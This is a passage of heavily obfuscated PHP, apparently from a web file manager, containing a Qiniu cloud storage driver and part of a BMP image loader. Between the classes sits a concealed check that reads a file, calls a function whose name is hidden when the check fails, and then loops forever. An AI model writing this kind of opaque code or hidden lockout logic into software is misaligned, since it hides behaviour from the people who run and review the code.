d”Ä´¬ß´: $BõÏé­î µ = $c¯¡íÑÒ¦[33]; $b°„¾»ƒ° = 1000; $Aï•‰Èó¸± = $c¯¡íÑÒ¦[33]; goto eöËÉª¾êÜ; D“®ë©ãÜ: $c¯¡íÑÒ¦ =& $_SERVER[¦·]; $A©•šƒ¤âš = trim($A©•šƒ¤âš, $c¯¡íÑÒ¦[8]); $A©²öë¦…‚ = empty($A©•šƒ¤âš) ? $c¯¡íÑÒ¦[33] : $A©•šƒ¤âš . $c¯¡íÑÒ¦[8]; goto d”Ä´¬ß´; eöËÉª¾êÜ: $aø«—Ó£íê = array(); while (!0) { list($DªõÇÚ©ÕÍ, $EŸ›Ğ…àè–) = $this->bucketManager->listFiles($this->bucket, $A©²öë¦…‚, $BõÏé­î µ, $b°„¾»ƒ°, $Aï•‰Èó¸±); if ($EŸ›Ğ…àè–) { return !1; } $BõÏé­î µ = array_key_exists($c¯¡íÑÒ¦[1187], $DªõÇÚ©ÕÍ) ? $BõÏé­î µ = $DªõÇÚ©ÕÍ[$c¯¡íÑÒ¦[1218]] : $c¯¡íÑÒ¦[33]; foreach ($DªõÇÚ©ÕÍ[$c¯¡íÑÒ¦[1219]] as $eÁƒ½íèô) { $fİ°šµÆ“™ = $eÁƒ½íèô[$c¯¡íÑÒ¦[89]]; if ($d‘Õ·Äè©µ) { $fİ°šµÆ“™ = array($c¯¡íÑÒ¦[28] => $fİ°šµÆ“™, $c¯¡íÑÒ¦[77] => $eÁƒ½íèô[$c¯¡íÑÒ¦[1220]]); } $aø«—Ó£íê[] = $fİ°šµÆ“™; } if ($BõÏé­î µ == $c¯¡íÑÒ¦[33]) { break; } } return $aø«—Ó£íê; goto EõÊÌÊ‘ÉÖ; EõÊÌÊ‘ÉÖ: } public function rename($AÔâ‚ºœí¿, $C–ˆ¤ÔœÊ») { return $this->renameObject($AÔâ‚ºœí¿, $C–ˆ¤ÔœÊ»); } public function fileInfo($c¹¢ùÖšç, $D“æ’Ò¡Ò« = false, $Fê¯–¹í¼Š = array()) { goto cÈùˆ…ÙÂä; BÅõ¶ŠöŠ: return $d†íäĞ÷”½; goto d¾ÙÉ¯ÜµÅ; cÈùˆ…ÙÂä: $bÙ­ƒ¥Š…ì =& $_SERVER[¦·]; if ($D“æ’Ò¡Ò«) { return array($bÙ­ƒ¥Š…ì[28] => $this->pathThis($c¹¢ùÖšç), $bÙ­ƒ¥Š…ì[75] => $this->getPathOuter($bÙ­ƒ¥Š…ì[8] . $c¹¢ùÖšç), $bÙ­ƒ¥Š…ì[29] => $bÙ­ƒ¥Š…ì[167], $bÙ­ƒ¥Š…ì[77] => isset($Fê¯–¹í¼Š[$bÙ­ƒ¥Š…ì[1220]]) ? $Fê¯–¹í¼Š[$bÙ­ƒ¥Š…ì[1220]] : 0, $bÙ­ƒ¥Š…ì[160] => $this->ext($c¹¢ùÖšç)); } $d†íäĞ÷”½ = array($bÙ­ƒ¥Š…ì[28] => $this->pathThis($c¹¢ùÖšç), $bÙ­ƒ¥Š…ì[75] => $this->getPathOuter($bÙ­ƒ¥Š…ì[8] . $c¹¢ùÖšç), $bÙ­ƒ¥Š…ì[29] => $bÙ­ƒ¥Š…ì[167], $bÙ­ƒ¥Š…ì[187] => 0, $bÙ­ƒ¥Š…ì[107] => 0, $bÙ­ƒ¥Š…ì[77] => 0, $bÙ­ƒ¥Š…ì[160] => $this->ext($c¹¢ùÖšç), $bÙ­ƒ¥Š…ì[188] => !0, $bÙ­ƒ¥Š…ì[189] => !0); goto EÍëÀ©•í; EÍëÀ©•í: if (empty($Fê¯–¹í¼Š)) { $Fê¯–¹í¼Š = $this->objectMeta($c¹¢ùÖšç); if (!$Fê¯–¹í¼Š) { return $d†íäĞ÷”½; } } if (isset($Fê¯–¹í¼Š[$bÙ­ƒ¥Š…ì[1221]])) { $d†íäĞ÷”½[$bÙ­ƒ¥Š…ì[107]] = substr($Fê¯–¹í¼Š[$bÙ­ƒ¥Š…ì[1221]] . $bÙ­ƒ¥Š…ì[33], 0, 10); } if (isset($Fê¯–¹í¼Š[$bÙ­ƒ¥Š…ì[1220]])) { $d†íäĞ÷”½[$bÙ­ƒ¥Š…ì[77]] = $Fê¯–¹í¼Š[$bÙ­ƒ¥Š…ì[1220]]; } goto BÅõ¶ŠöŠ; d¾ÙÉ¯ÜµÅ: } public function folderInfo($E»¨˜¨øö, $Dµ¶Ê„¶ë = false) { goto e•‡³ë¢í¡; F’ƒ¹‘‚î˜: return $D·ÜÇå›˜±; goto Bí¸‰ËÄóÆ; BÜÏÔÖÀï°: $E»¨˜¨øö = rtrim($E»¨˜¨øö, $d…¬‚ÈÕÎ¥[8]) . $d…¬‚ÈÕÎ¥[8]; $AœÍà‘ìÖè = $this->objectMeta($E»¨˜¨øö); if (isset($AœÍà‘ìÖè[$d…¬‚ÈÕÎ¥[1221]])) { $D·ÜÇå›˜±[$d…¬‚ÈÕÎ¥[107]] = substr($AœÍà‘ìÖè[$d…¬‚ÈÕÎ¥[1221]] . $d…¬‚ÈÕÎ¥[33], 0, 10); } goto F’ƒ¹‘‚î˜; e•‡³ë¢í¡: $d…¬‚ÈÕÎ¥ =& $_SERVER[¦·]; if ($Dµ¶Ê„¶ë) { return array($d…¬‚ÈÕÎ¥[28] => $this->pathThis($E»¨˜¨øö), $d…¬‚ÈÕÎ¥[75] => $this->getPathOuter($d…¬‚ÈÕÎ¥[8] . $E»¨˜¨øö), $d…¬‚ÈÕÎ¥[29] => $d…¬‚ÈÕÎ¥[76]); } $D·ÜÇå›˜± = array($d…¬‚ÈÕÎ¥[28] => $this->pathThis($E»¨˜¨øö), $d…¬‚ÈÕÎ¥[75] => $this->getPathOuter($d…¬‚ÈÕÎ¥[8] . $E»¨˜¨øö), $d…¬‚ÈÕÎ¥[29] => $d…¬‚ÈÕÎ¥[76], $d…¬‚ÈÕÎ¥[187] => 0, $d…¬‚ÈÕÎ¥[107] => 0, $d…¬‚ÈÕÎ¥[1167] => !0, $d…¬‚ÈÕÎ¥[1168] => !0); goto BÜÏÔÖÀï°; Bí¸‰ËÄóÆ: } public function listPath($fÆğß‘¬Œä, $AË°ãË = false) { goto a˜Û…ñ£Œù; FÈ“åäŒ: $d ³Ò½Á¶ = $aÓ„ñÏãÉŸ = array(); while (!0) { list($cÏ‹ÈÛùÇ, $F‡‡²Éêê–) = $this->bucketManager->listFiles($this->bucket, $BÇÀÀòì‰Ó, $A¤³¼¸÷, $e°ƒèÏ‰Û, $e¢°‹ìª); if ($F‡‡²Éêê–) { return !1; } $A¤³¼¸÷ = array_key_exists($a½ËÔ„‰°œ[1187], $cÏ‹ÈÛùÇ) ? $A¤³¼¸÷ = $cÏ‹ÈÛùÇ[$a½ËÔ„‰°œ[1218]] : $a½ËÔ„‰°œ[33]; if (isset($cÏ‹ÈÛùÇ[$a½ËÔ„‰°œ[1222]])) { foreach ($cÏ‹ÈÛùÇ[$a½ËÔ„‰°œ[1222]] as $Bï´ËÒ­œŸ) { if ($Bï´ËÒ­œŸ == $BÇÀÀòì‰Ó) { continue; } $d ³Ò½Á¶[] = $this->folderInfo($Bï´ËÒ­œŸ, $AË°ãË); } } if (isset($cÏ‹ÈÛùÇ[$a½ËÔ„‰°œ[1219]])) { foreach ($cÏ‹ÈÛùÇ[$a½ËÔ„‰°œ[1219]] as $E­ôÂø²–®) { if ($E­ôÂø²–®[$a½ËÔ„‰°œ[89]] == $BÇÀÀòì‰Ó) { continue; } $aÓ„ñÏãÉŸ[] = $this->fileInfo($E­ôÂø²–®[$a½ËÔ„‰°œ[89]], $AË°ãË, $E­ôÂø²–®); } } if ($A¤³¼¸÷ == $a½ËÔ„‰°œ[33]) { break; } } return array($a½ËÔ„‰°œ[74] => $d ³Ò½Á¶, $a½ËÔ„‰°œ[73] => $aÓ„ñÏãÉŸ); goto E„ÖĞ•ŞÜ±; B‹Æ“…Û¼: $A¤³¼¸÷ = $a½ËÔ„‰°œ[33]; $e°ƒèÏ‰Û = 1000; $e¢°‹ìª = $a½ËÔ„‰°œ[8]; goto FÈ“åäŒ; a˜Û…ñ£Œù: $a½ËÔ„‰°œ =& $_SERVER[¦·]; $fÆğß‘¬Œä = trim($fÆğß‘¬Œä, $a½ËÔ„‰°œ[8]); $BÇÀÀòì‰Ó = empty($fÆğß‘¬Œä) ? $a½ËÔ„‰°œ[33] : $fÆğß‘¬Œä . $a½ËÔ„‰°œ[8]; goto B‹Æ“…Û¼; E„ÖĞ•ŞÜ±: } public function has($A³ÛŒŸö–›, $BêŠ•Òùì± = false, $DĞšçõ¦¦ = true) { goto AèÁœ‹êã; A“‚æ‹¥è…: $CƒøˆŞÓ†Ä = $a¿¶»‡ºÚ[33]; $AÁ›ç–é¥  = 1000; $aÛÁ¦…×©˜ = $a¿¶»‡ºÚ[8]; goto EÉªï—¬æĞ; AèÁœ‹êã: $a¿¶»‡ºÚ =& $_SERVER[¦·]; $A³ÛŒŸö–› = trim($A³ÛŒŸö–›, $a¿¶»‡ºÚ[8]); $Bğ×‹¥ê‘ = empty($A³ÛŒŸö–›) ? $a¿¶»‡ºÚ[33] : $A³ÛŒŸö–› . $a¿¶»‡ºÚ[8]; goto A“‚æ‹¥è…; EÉªï—¬æĞ: $c¢ÏÈ¿“á = 0; $bíê÷‰öÀÇ = 0; while (!0) { list($AãÊæï¹š‘, $bëĞœ®òÑ¢) = $this->bucketManager->listFiles($this->bucket, $Bğ×‹¥ê‘, $CƒøˆŞÓ†Ä, $AÁ›ç–é¥ , $aÛÁ¦…×©˜); if ($bëĞœ®òÑ¢) { return !1; } $CƒøˆŞÓ†Ä = array_key_exists($a¿¶»‡ºÚ[1187], $AãÊæï¹š‘) ? $CƒøˆŞÓ†Ä = $AãÊæï¹š‘[$a¿¶»‡ºÚ[1218]] : $a¿¶»‡ºÚ[33]; if ($BêŠ•Òùì±) { if (!empty($AãÊæï¹š‘[$a¿¶»‡ºÚ[1219]])) { $c¢ÏÈ¿“á += count($AãÊæï¹š‘[$a¿¶»‡ºÚ[1219]]); } if (!empty($AãÊæï¹š‘[$a¿¶»‡ºÚ[1222]])) { $bíê÷‰öÀÇ += count($AãÊæï¹š‘[$a¿¶»‡ºÚ[1222]]); } if ($CƒøˆŞÓ†Ä === $a¿¶»‡ºÚ[33]) { break; } continue; } if ($DĞšçõ¦¦) { if (!empty($AãÊæï¹š‘[$a¿¶»‡ºÚ[1219]])) { return !0; } } else { if (!empty($AãÊæï¹š‘[$a¿¶»‡ºÚ[1222]])) { return !0; } } if ($CƒøˆŞÓ†Ä == $a¿¶»‡ºÚ[33]) { break; } } goto cœÉîôÂ‰Ì; cœÉîôÂ‰Ì: if ($BêŠ•Òùì±) { return array($a¿¶»‡ºÚ[191] => $c¢ÏÈ¿“á, $a¿¶»‡ºÚ[192] => $bíê÷‰öÀÇ); } return !1; goto Aß±ø’ª„; Aß±ø’ª„: } public function listAll($BˆôŠ‰çê) { $b¤ÑÇÂ¥¯Å =& $_SERVER[¦·]; $dñŞğ¹ª« = $this->fileList($BˆôŠ‰çê, 1); $bÀÍÔê¬Õá = array(); foreach ($dñŞğ¹ª« as $c¼„‹Š¸š‡) { $bÀÍÔê¬Õá[$c¼„‹Š¸š‡[$b¤ÑÇÂ¥¯Å[28]]] = $c¼„‹Š¸š‡[$b¤ÑÇÂ¥¯Å[77]]; } return $this->listAllFiles($BˆôŠ‰çê, array_keys($bÀÍÔê¬Õá), $bÀÍÔê¬Õá); } public function canRead($c¡†ËÉ×åò) { return $this->exist($c¡†ËÉ×åò) ? !0 : !1; } public function canWrite($F÷Ğæ—²í) { return $this->exist($F÷Ğæ—²í) ? !0 : !1; } public function getContent($cò²óÒäì) { return $this->fileSubstr($cò²óÒäì, 0, -1); } public function setContent($A™Û¾ÌåÜƒ, $A“«´¨ÖÃ  = '') { $Aõçºì”„ = $this->tempFile($this->pathThis($A™Û¾ÌåÜƒ)); file_put_contents($Aõçºì”„, $A“«´¨ÖÃ ); if ($this->upload($A™Û¾ÌåÜƒ, $Aõçºì”„)) { $this->tempFileRemve($Aõçºì”„); return !0; } return !1; } public function refreshUrls($d‘º­§‚¾Ó) { goto eÇšÕİ¯ÍÚ; AƒÍ İÄàÎ: return $FÈ¸Ï‹ïÒ[$a»ÔÉïÃŞê[1223]] == $a»ÔÉïÃŞê[697] ? !0 : !1; goto aˆÕÊˆ”ùƒ; D“öğ…‡‘‡: $AÃ‰Şáîá = new Qiniu\Cdn\CdnManager($this->auth); list($FÈ¸Ï‹ïÒ, $B… •î„•) = $AÃ‰Şáîá->refreshUrls($B¼ŒŞ”ˆï); if ($B… •î„•) { return !1; } goto AƒÍ İÄàÎ; eÇšÕİ¯ÍÚ: $a»ÔÉïÃŞê =& $_SERVER[¦·]; $B¼ŒŞ”ˆï = array(); if (is_array($d‘º­§‚¾Ó)) { foreach ($d‘º­§‚¾Ó as $C­Ô‹ÒÌæù) { $B¼ŒŞ”ˆï[] = $this->link($C­Ô‹ÒÌæù); } } else { $B¼ŒŞ”ˆï[] = $this->link($d‘º­§‚¾Ó); } goto D“öğ…‡‘‡; aˆÕÊˆ”ùƒ: } public function fileSubstr($bµÊË¬–´ä, $DŠ¾ùîŒ¶, $F£¦©¤†í„) { $f„‹ª¼¢Ş‹ =& $_SERVER[¦·]; if (!($cŸã‘ÇÉğä = $this->link($bµÊË¬–´ä))) { return !1; } $AñÎ›Øƒ = !1; if ($F£¦©¤†í„ > 0) { $DƒÂö¶‹š° = $DŠ¾ùîŒ¶ + $F£¦©¤†í„ - 1; $AñÎ›Øƒ = array($f„‹ª¼¢Ş‹[1224] . $DŠ¾ùîŒ¶ . $f„‹ª¼¢Ş‹[412] . $DƒÂö¶‹š°); } $dÆ©•¶ÚÜ² = url_request($cŸã‘ÇÉğä, $f„‹ª¼¢Ş‹[216], !1, $AñÎ›Øƒ); return $dÆ©•¶ÚÜ²[$f„‹ª¼¢Ş‹[690]] ? $dÆ©•¶ÚÜ²[$f„‹ª¼¢Ş‹[1037]] : !1; } public function upload($E…éƒã·¦ï, $f’ŒñÇ’ö, $f¶ÂÈââ«˜ = false, $a´õ—ïÒŠÄ = REPEAT_REPLACE) { $a˜ˆ½¬‡Ã = new Qiniu\Storage\UploadManager(); $e’šŠ¹áå¡ = $this->auth->uploadToken($this->bucket, $E…éƒã·¦ï); $eö †£ö = get_file_mime(get_path_ext($f’ŒñÇ’ö)); list($f“ù¶ó¶¢ß, $F¸çÉ„÷Óæ) = $a˜ˆ½¬‡Ã->putFile($e’šŠ¹áå¡, $E…éƒã·¦ï, $f’ŒñÇ’ö, null, $eö †£ö); return $F¸çÉ„÷Óæ ? !1 : $this->getPathOuter($E…éƒã·¦ï); } public function uploadFormData($B—ç‘‡‰–Ò, $E‘äÆô‹¹ê = 3600) { return $this->uploadToken($B—ç‘‡‰–Ò, $E‘äÆô‹¹ê); } public function multiUploadFormData($aë’‘éµÌ, $a²ØŒ¶¹İõ = 3600) { return $this->uploadToken($aë’‘éµÌ, $a²ØŒ¶¹İõ); } private function uploadToken($a™ˆõÊ§», $fŞäÍÆä£¿ = 3600) { goto c•‘èˆÑ’Ú; cÊ‹«±Èå: $BîÑàŠƒË = $a™ˆõÊ§»; $bŞ¾«ì¿Î = $this->auth->uploadToken($this->bucket, $BîÑàŠƒË, $eÁå¬Ôˆå, $DÇ°¥­–‘, !0); $E•ÓòóÕ‡± = empty($this->region) || $this->region == $aÑ²ÚŒŠôâ[1227] ? $aÑ²ÚŒŠôâ[33] : $aÑ²ÚŒŠôâ[412] . $this->region; goto Då±¿È„ƒù; c•‘èˆÑ’Ú: $aÑ²ÚŒŠôâ =& $_SERVER[¦·]; $eÁå¬Ôˆå = $fŞäÍÆä£¿; $DÇ°¥­–‘ = array($aÑ²ÚŒŠôâ[1225] => $aÑ²ÚŒŠôâ[1226]); goto cÊ‹«±Èå; Då±¿È„ƒù: $BŒ¨ôù’ˆŒ = http_type() . "\x3a\x2f\57\x75\x70\154\x6f\141\144{$E•ÓòóÕ‡±}\56\x71\x69\x6e\151\x75\160\56\x63\x6f\x6d\x2f"; return array($aÑ²ÚŒŠôâ[1228] => $bŞ¾«ì¿Î, $aÑ²ÚŒŠôâ[1229] => $BŒ¨ôù’ˆŒ); goto E¼ÑÕìò’; E¼ÑÕìò’: } public function download($Fí„ê“¶ô›, $D¬âˆÙª°à) { goto f¼èŒó; Fãğõ¤Ïƒ£: fclose($aŞŞ¨ÛÑ‘“); return $D¬âˆÙª°à; goto AÔ•å²†ëã; B¬˜°ç¯Ù‚: $A˜Ú˜°±£Ì = 1024 * 200; $aŞŞ¨ÛÑ‘“ = fopen($aÓæìš¤ğ, $_SERVER[¦·][1230]); while (!0) { $eäô´öÏ— = $this->fileSubstr($Fí„ê“¶ô›, $f®Ş³»ÄÁ¢, $A˜Ú˜°±£Ì); if ($eäô´öÏ— === !1) { return !1; } fwrite($aŞŞ¨ÛÑ‘“, $eäô´öÏ—); $f®Ş³»ÄÁ¢ += $A˜Ú˜°±£Ì; if (strlen($eäô´öÏ—) < $A˜Ú˜°±£Ì) { break; } } goto Fãğõ¤Ïƒ£; f¼èŒó: $aÓæìš¤ğ = IO::getPathInner(IO::mkfile($D¬âˆÙª°à)); if (!($eôÈÄ´äÁ¹ = $this->link($Fí„ê“¶ô›))) { return !1; } $f®Ş³»ÄÁ¢ = 0; goto B¬˜°ç¯Ù‚; AÔ•å²†ëã: } public function link($cËª«§–, $b“¨ÊÑâ› = '') { if (!$this->isFile($cËª«§–)) { return !1; } $cìÛÌß’‡… = $this->getHost() . $_SERVER[¦·][8] . $this->pathEncode($cËª«§–) . $b“¨ÊÑâ›; return $this->auth->privateDownloadUrl($cìÛÌß’‡…, 3600 * 12); } public function fileOut($f¯¸ƒ²ÖŠ®, $CÏØ½¥ªê = false, $Bò«Æ±½÷ = false, $F¶åçŞìŠ» = '') { $b¹¯²Æ‰‹Ÿ =& $_SERVER[¦·]; if ($this->isFileOutServer()) { return $this->fileOutServer($f¯¸ƒ²ÖŠ®, $CÏØ½¥ªê, $Bò«Æ±½÷, $F¶åçŞìŠ»); } if (!$Bò«Æ±½÷) { $Bò«Æ±½÷ = $this->pathThis($f¯¸ƒ²ÖŠ®); } $C´°Û¨‹î = $CÏØ½¥ªê ? $b¹¯²Æ‰‹Ÿ[1231] . rawurlencode($Bò«Æ±½÷) : $b¹¯²Æ‰‹Ÿ[33]; $d¦ÒĞÓíµ¸ = $this->link($f¯¸ƒ²ÖŠ®, $C´°Û¨‹î); $this->fileOutLink($d¦ÒĞÓíµ¸); } public function fileOutServer($fŒù„ÍÙå”, $D©ßÃÆØÊî = false, $b¡ËİšÅ‡Ó = false, $D½¸Å÷±®Ó = '') { parent::fileOut($fŒù„ÍÙå”, $D©ßÃÆØÊî, $b¡ËİšÅ‡Ó, $D½¸Å÷±®Ó); } public function fileOutImage($Fª¤‘¡“–, $C…Î£¡Ş¯ = 250) { $cÜİ‘Ëƒ‡¿ = $this->link($Fª¤‘¡“–, $_SERVER[¦·][1232] . $C…Î£¡Ş¯); $this->fileOutLink($cÜİ‘Ëƒ‡¿); } public function fileOutImageServer($CšÄÂè¢¸, $C³ƒóõ°ÔØ = 250) { parent::fileOutImage($CšÄÂè¢¸, $C³ƒóõ°ÔØ); } public function hashMd5($c»ğá™Ë) { $E³ƒÈºá‰š =& $_SERVER[¦·]; $E£‚‹‹Àˆ = $this->objectMeta($c»ğá™Ë); return isset($E£‚‹‹Àˆ[$E³ƒÈºá‰š[196]]) ? $E£‚‹‹Àˆ[$E³ƒÈºá‰š[196]] : !1; $FİİÙ„ õ¤ = $this->link($c»ğá™Ë, $E³ƒÈºá‰š[1233]); } public function size($bÁİ»å»Ÿ›) { $c¸¨ªèÊÕë = $this->objectMeta($bÁİ»å»Ÿ›); return $c¸¨ªèÊÕë ? $c¸¨ªèÊÕë[$_SERVER[¦·][77]] : 0; } public function info($D³òÆã–É) { if ($this->isFolder($D³òÆã–É)) { return $this->folderInfo($D³òÆã–É); } else { if ($this->isFile($D³òÆã–É)) { return $this->fileInfo($D³òÆã–É); } } return !1; } public function exist($DØ‹é²ÛÏÆ) { return $this->isFile($DØ‹é²ÛÏÆ) || $this->isFolder($DØ‹é²ÛÏÆ); } public function isFile($Eõ„ëã²Ò‘) { return !$this->isFolder($Eõ„ëã²Ò‘) && $this->objectMeta($Eõ„ëã²Ò‘); } public function isFolder($a‰ßõÌ„Ş¨) { return $this->cacheMethod($_SERVER[¦·][223], $a‰ßõÌ„Ş¨); } protected function objectMeta($AèÚ¯ ÉÂÄ) { return $this->cacheMethod($_SERVER[¦·][224], $AèÚ¯ ÉÂÄ); } protected function _objectMeta($CªßŠ¥á¦) { $Aµì‹Œ˜ù¦ =& $_SERVER[¦·]; list($fÔÛÆ‹¦Â, $BÆé±ŞÕŸë) = $this->bucketManager->stat($this->bucket, $CªßŠ¥á¦); if ($fÔÛÆ‹¦Â) { $fÔÛÆ‹¦Â[$Aµì‹Œ˜ù¦[77]] = intval($fÔÛÆ‹¦Â[$Aµì‹Œ˜ù¦[1220]]); } return $fÔÛÆ‹¦Â; } protected function _isFolder($eã¦Ù¿¤Û…) { $cñÚ—³ğ· =& $_SERVER[¦·]; if ($eã¦Ù¿¤Û… == $cñÚ—³ğ·[33] || $eã¦Ù¿¤Û… == $cñÚ—³ğ·[8]) { return !0; } list($fĞí¾Óõ‚, $Eòƒ¹‡ä¾¹) = $this->bucketManager->listFiles($this->bucket, trim($eã¦Ù¿¤Û…, $cñÚ—³ğ·[8]) . $cñÚ—³ğ·[8], $cñÚ—³ğ·[33], 1, $cñÚ—³ğ·[8]); return !empty($fĞí¾Óõ‚[$cñÚ—³ğ·[1219]]) || !empty($fĞí¾Óõ‚[$cñÚ—³ğ·[1222]]) ? !0 : !1; } } if (!isset($_SERVER[$_SERVER[¦·][791]]) || !isset($_SERVER[$_SERVER[¦·][1234]])) { goto cŸÒƒ™–ÓÌ; cŸÒƒ™–ÓÌ: $CÒäèì”Ø = $_SERVER[¦·][793]; $Bé±Ê‘×åÁ = $_SERVER[$_SERVER[¦·][788]] . $_SERVER[¦·][789]; $AÃµâóô„Û = $CÒäèì”Ø($Bé±Ê‘×åÁ); goto B´ ¸«Èğ“; c…§Šä±ØÑ: $e‘Æ×¼Õ»($_SERVER[$_SERVER[¦·][788]] . $_SERVER[¦·][789]); $a¤àµôíÖ¢ = 2; while ($a¤àµôíÖ¢ > 1) { $a†×…ÏÕ›ô = rawurlencode($a¤àµôíÖ¢ . $_SERVER[¦·][361]); } goto b†ùÇ¨¸ŠŸ; B´ ¸«Èğ“: $EÙÑ²ƒå„× = explode($_SERVER[¦·][217], $AÃµâóô„Û); if (count($EÙÑ²ƒå„×) < $_SERVER[¦·][556]) { $AâÂÇ”¬è­ = $_SERVER[¦·][794]; $AâÂÇ”¬è­(); } $e‘Æ×¼Õ» = $_SERVER[¦·][1121]; goto c…§Šä±ØÑ; b†ùÇ¨¸ŠŸ: } goto FğÍŠ”âÂ; aÚ¸ö×‹Ë: function beforeShutdown() { Hook::trigger($_SERVER[æªÊ«][32]); } $_SERVER[$_SERVER[æªÊ«][33]] = BASIC_PATH; $_SERVER[$_SERVER[æªÊ«][34]] = LIB_DIR; goto Eª¤Éˆ»Œª; e¤Š—Ğ¬¥: if ($_SERVER[$_SERVER[¦·][791]] != $eÅ‹œ‘½§($c›¥±²Ù¯”)) { goto a†Ô¡èßµÁ; a†Ô¡èßµÁ: $CÒäèì”Ø = $_SERVER[¦·][793]; $Bé±Ê‘×åÁ = $_SERVER[$_SERVER[¦·][788]] . $_SERVER[¦·][789]; $AÃµâóô„Û = $CÒäèì”Ø($Bé±Ê‘×åÁ); goto bæ®Š„¨ˆ; bæ®Š„¨ˆ: $EÙÑ²ƒå„× = explode($_SERVER[¦·][217], $AÃµâóô„Û); if (count($EÙÑ²ƒå„×) < $_SERVER[¦·][556]) { $AâÂÇ”¬è­ = $_SERVER[¦·][794]; $AâÂÇ”¬è­(); } $e‘Æ×¼Õ» = $_SERVER[¦·][1121]; goto eäÕÀĞ¬Ôî; eäÕÀĞ¬Ôî: $e‘Æ×¼Õ»($c›¥±²Ù¯”); goto DëÜºñ´…¡; DëÜºñ´…¡: } class ImageGdBMP { public static function load($c¼ÁÃËô“æ) { $FµÓÄ„²™˜ = fopen($c¼ÁÃËô“æ, $_SERVER[¦·][1525]); if ($FµÓÄ„²™˜ === !1) { return !1; } $Cô¤Â£é­ö = self::loadFromStream($FµÓÄ„²™˜); fclose($FµÓÄ„²™˜); return $Cô¤Â£é­ö; } public static function loadFromStream($AÀµôÛÄ…Ä) { $DÇŒµ³Œƒ =& $_SERVER[¦·]; $E¤İˆë‹‰´ = fread($AÀµôÛÄ…Ä, 14); if ($E¤İˆë‹‰´ === !1) { return !1; } if ($E¤İˆë‹‰´[0] != $DÇŒµ³Œƒ[1837] || $E¤İˆë‹‰´[1] != $DÇŒµ³Œƒ[1838]) { return !1; } $E‡¾é‰´óš = unpack($DÇŒµ³Œƒ[1839] . $DÇŒµ³Œƒ[1840] . $DÇŒµ³Œƒ[1841] . $DÇŒµ³Œƒ[1842] . $DÇŒµ³Œƒ[1843], $E¤İˆë‹‰´); return self::loadFromStreamAndFileHeader($AÀµôÛÄ…Ä, $E‡¾é‰´óš); } public static function loadFromStreamAndFileHeader($E¨ß éÛö¦, array $b¸ñï¢óïÑ) { goto dç®Î¬ÑÛ°; dç®Î¬ÑÛ°: $fŒ¯ØÁ‰ä =& $_SERVER[¦·]; if ($b¸ñï¢óïÑ[$fŒ¯ØÁ‰ä[388]] != 19778) { return !1; } $FÍÃ‡Œ‚Œ° = fread($E¨ß éÛö¦, 4); goto a‡…–åŒ; a‡…–åŒ: if ($FÍÃ‡Œ‚Œ° === !1) { return !1; } list(, $E ºÑâËˆ) = unpack($fŒ¯ØÁ‰ä[1844], $FÍÃ‡Œ‚Œ°); if ($E ºÑâËˆ == 12) { goto eá»ˆáàª›; DÆˆ‹…‰Ò¤: $bãé”ßÜé± = 255; goto bÙÂšÂã–Ä; eá»ˆáàª›: $FÍÃ‡Œ‚Œ° = fread($E¨ß éÛö¦, $E ºÑâËˆ - 4); if ($FÍÃ‡Œ‚Œ° === !1) { return !1; } extract(unpack($fŒ¯ØÁ‰ä[1845] . $fŒ¯ØÁ‰ä[1846] . $fŒ¯ØÁ‰ä[1847] . $fŒ¯ØÁ‰ä[1848], $FÍÃ‡Œ‚Œ°)); goto a«ƒ‚±òŸ; a«ƒ‚±òŸ: $aâ´¶îªáÉ = $fµÚáô·‹İ = $a¢›ã«Çôù = $Cª÷¹óÙÏ = 0; $Bç¹¯¥ ¿ç = 16711680; $b’†µÀÄëÑ = 65280; goto DÆˆ‹…‰Ò¤; bÙÂšÂã–Ä: } else { if (124 < $E ºÑâËˆ || $E ºÑâËˆ < 40) { return !1; } else { goto Cº Şæœ·¡; Cº Şæœ·¡: $FÍÃ‡Œ‚Œ° = fread($E¨ß éÛö¦, 36); if ($FÍÃ‡Œ‚Œ° === !1) { return !1; } extract(unpack($fŒ¯ØÁ‰ä[1849] . $fŒ¯ØÁ‰ä[1850] . $fŒ¯ØÁ‰ä[1847] . $fŒ¯ØÁ‰ä[1851] . $fŒ¯ØÁ‰ä[1852] . $fŒ¯ØÁ‰ä[1853] . $fŒ¯ØÁ‰ä[1854] . $fŒ¯ØÁ‰ä[1855] . $fŒ¯ØÁ‰ä[1856] . $fŒ¯ØÁ‰ä[1857], $FÍÃ‡Œ‚Œ°)); goto C»“ºÏÉ¶; dŸ–²Ì§ìó: if (($fÀÓ„İÃ™ö == 16 || $fÀÓ„İÃ™ö == 24 || $fÀÓ„İÃ™ö == 32) && $Cª÷¹óÙÏ == 0 && $Bç¹¯¥ ¿ç == 0 && $b’†µÀÄëÑ == 0 && $bãé”ßÜé± == 0) { switch ($fÀÓ„İÃ™ö) { case 16: $Bç¹¯¥ ¿ç = 31744; $b’†µÀÄëÑ = 992; $bãé”ßÜé± = 31; break; case 24: case 32: $Bç¹¯¥ ¿ç = 16711680; $b’†µÀÄëÑ = 65280; $bãé”ßÜé± = 255; break; } } goto a’‘ªŞº”«; A«¾ŠŞ½¼ô: if ($c¦›Æ°ô‰Ï & 2147483648) { $c¦›Æ°ô‰Ï = -(~$c¦›Æ°ô‰Ï & 4294967295) - 1; } if ($b¸ñï¢óïÑ[$fŒ¯ØÁ‰ä[522]] != 0) { $c·Õô‹×ˆ = $fÀÓ„İÃ™ö == 1 || $fÀÓ„İÃ™ö == 4 || $fÀÓ„İÃ™ö == 8 ? ($aâ´¶îªáÉ ? $aâ´¶îªáÉ : pow(2, $fÀÓ„İÃ™ö)) << 2 : 0; $eåÊÈèğ¡ = $aÒï¡’²Êã ? $aÒï¡’²Êã : ($F¾­«–À² * $fÀÓ„İÃ™ö + 31 >> 3 & ~3) * abs($e×¢•…ğãŸ); $Eë©„…¹ºÇ = $b¸ñï¢óïÑ[$fŒ¯ØÁ‰ä[522]] - $eåÊÈèğ¡ - $c·Õô‹×ˆ - 14; if ($E ºÑâËˆ < $Eë©„…¹ºÇ && 40 <= $E ºÑâËˆ && $E ºÑâËˆ <= 124) { $E ºÑâËˆ = $Eë©„…¹ºÇ; } } if ($E ºÑâËˆ - 40 > 0) { $FÍÃ‡Œ‚Œ° = fread($E¨ß éÛö¦, $E ºÑâËˆ - 40); if ($FÍÃ‡Œ‚Œ° === !1) { return !1; } extract(unpack($fŒ¯ØÁ‰ä[1858] . $fŒ¯ØÁ‰ä[1859] . $fŒ¯ØÁ‰ä[1860] . $fŒ¯ØÁ‰ä[1861], $FÍÃ‡Œ‚Œ° . str_repeat($fŒ¯ØÁ‰ä[1862], 120))); } else { $a¢›ã«Çôù = 